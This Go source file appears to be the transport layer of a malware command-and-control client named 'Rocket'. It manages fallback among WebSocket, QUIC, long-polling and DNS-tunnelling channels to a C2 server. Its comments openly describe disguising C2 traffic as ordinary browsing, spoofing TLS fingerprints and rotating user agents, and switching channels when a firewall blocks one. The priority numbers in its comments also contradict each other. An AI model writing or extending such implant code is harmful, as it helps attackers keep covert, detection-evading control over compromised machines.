package transport

import (
	"Rocket/client/common"
	"context"
	"errors"
	"time"
)

// Transport defines the interface that all communication transports must implement
type Transport interface {
	// Name returns the transport name (e.g., "websocket", "longpolling", "dns")
	Name() string

	// Connect establishes a connection using this transport
	// Returns (*common.Conn, error)
	Connect(ctx context.Context, config *Config) (*common.Conn, error)

	// IsAvailable checks if this transport can be used (e.g., DNS resolver available)
	IsAvailable(ctx context.Context) bool

	// Priority returns the priority level (lower = higher priority)
	// WebSocket: 10, Long Polling: 20, DNS: 30
	Priority() int

	// Close cleans up transport resources
	Close() error
}

// Config contains configuration for all transports
type Config struct {
	// Server connection
	ServerURL  string // Base URL (e.g., "https://gapict.com:8443")
	UUID       string
	Key        string
	Secret     []byte

	// Timeouts
	ConnectTimeout time.Duration
	ReadTimeout    time.Duration
	WriteTimeout   time.Duration

	// TLS settings
	InsecureSkipVerify bool

	// DNS-specific
	DNSServer      string // DNS server IP (e.g., "8.8.8.8:53")
	DNSDomain      string // Domain for DNS tunneling (e.g., "c2.example.com")

	// Long polling specific
	LongPollTimeout time.Duration
	LongPollPath    string // e.g., "/api/poll"

	// QUIC specific
	QUICEnabled bool
	QUICPort    int // e.g., 443

	// Protocol mimicry
	Mimicry *ProtocolMimicryConfig
}

// ProtocolMimicryConfig contains settings for protocol mimicry
// Makes C2 traffic appear as legitimate web browsing or API calls
type ProtocolMimicryConfig struct {
	// Enabled toggles protocol mimicry
	Enabled bool

	// UserAgent for HTTP requests (rotate between common browsers)
	UserAgents []string

	// Additional headers to mimic real traffic (Accept, Accept-Language, etc.)
	Headers map[string]string

	// Mimic specific protocol (http2, h2, grpc, websocket-fallback)
	Protocol string

	// JA3 TLS fingerprint customization
	TLSFingerprint string
}

var (
	// ErrTransportUnavailable is returned when a transport cannot be used
	ErrTransportUnavailable = errors.New("transport unavailable")

	// ErrAllTransportsFailed is returned when all transports have failed
	ErrAllTransportsFailed = errors.New("all transports failed")

	// ErrTransportBlocked is returned when a transport appears to be blocked
	ErrTransportBlocked = errors.New("transport appears to be blocked by firewall")
)

// Manager manages multiple transports and provides fallback logic
type Manager struct {
	transports []Transport
	config     *Config
}

// NewManager creates a new transport manager with all available transports
// Priority order: WS → WSS → QUIC → Long Polling → DNS
func NewManager(config *Config) *Manager {
	m := &Manager{
		config:     config,
		transports: []Transport{},
	}

	// Add transports in priority order
	m.transports = append(m.transports, NewWebSocketTransport(false)) // WS (priority 10)
	m.transports = append(m.transports, NewWebSocketTransport(true))  // WSS (priority 15)

	if config.QUICEnabled {
		m.transports = append(m.transports, NewQUICTransport()) // QUIC (priority 20)
	}

	m.transports = append(m.transports, NewLongPollingTransport()) // Long Polling (priority 30)
	m.transports = append(m.transports, NewDNSTransport())         // DNS (priority 40)

	// Sort transports by priority (already in order, but be explicit)
	sortTransports(m.transports)

	return m
}

// Connect attempts to connect using transports in priority order
// Falls back to next transport on failure
func (m *Manager) Connect(ctx context.Context) (*common.Conn, Transport, error) {
	var lastErr error

	for _, transport := range m.transports {
		// Check if transport is available
		if !transport.IsAvailable(ctx) {
			continue
		}

		// Attempt connection
		conn, err := transport.Connect(ctx, m.config)
		if err == nil {
			return conn, transport, nil
		}

		lastErr = err

		// If transport appears blocked, try next immediately
		if errors.Is(err, ErrTransportBlocked) {
			continue
		}

		// Add small delay before trying next transport
		select {
		case <-ctx.Done():
			return nil, nil, ctx.Err()
		case <-time.After(500 * time.Millisecond):
		}
	}

	if lastErr != nil {
		return nil, nil, lastErr
	}

	return nil, nil, ErrAllTransportsFailed
}

// Close closes all transports
func (m *Manager) Close() error {
	var lastErr error
	for _, t := range m.transports {
		if err := t.Close(); err != nil {
			lastErr = err
		}
	}
	return lastErr
}

// sortTransports sorts transports by priority (ascending)
func sortTransports(transports []Transport) {
	// Simple bubble sort (we only have a few transports)
	n := len(transports)
	for i := 0; i < n-1; i++ {
		for j := 0; j < n-i-1; j++ {
			if transports[j].Priority() > transports[j+1].Priority() {
				transports[j], transports[j+1] = transports[j+1], transports[j]
			}
		}
	}
}
